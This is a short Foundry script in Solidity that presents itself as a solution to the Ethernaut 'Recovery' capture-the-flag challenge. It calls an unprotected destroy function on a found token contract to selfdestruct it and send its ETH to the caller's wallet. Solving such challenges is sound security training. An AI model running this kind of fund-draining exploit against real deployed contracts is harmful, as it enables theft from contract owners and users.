// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Recovery, SimpleToken} from "../src/Recovery.sol";

/// @author agadzhalov
/// @title Solution to Recovery Ethernaut challenge
/// @notice Solution: 
///         The easiest way is to scan through Etherscan to find the contract holding 0.0001 ETH.
///         Once we locate the contract address, we can execute `selfdestruct` to send the funds to our wallet.
contract RecoveryScript is Script {
    SimpleToken private immutable token = SimpleToken(payable(0xbdd0F360d68D284aAdA17B10161a3141cF739e6E));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Log the initial balance of the token contract
        console.log("1. Balance of token", address(token).balance);

        // Destroy the token contract and send remaining funds to specified wallet address
        token.destroy(payable(vm.envAddress("WALLLET_ADDRESS")));

        // Log the balance of the token contract after destruction
        console.log("2. Balance of token", address(token).balance);

        vm.stopBroadcast();
    }
}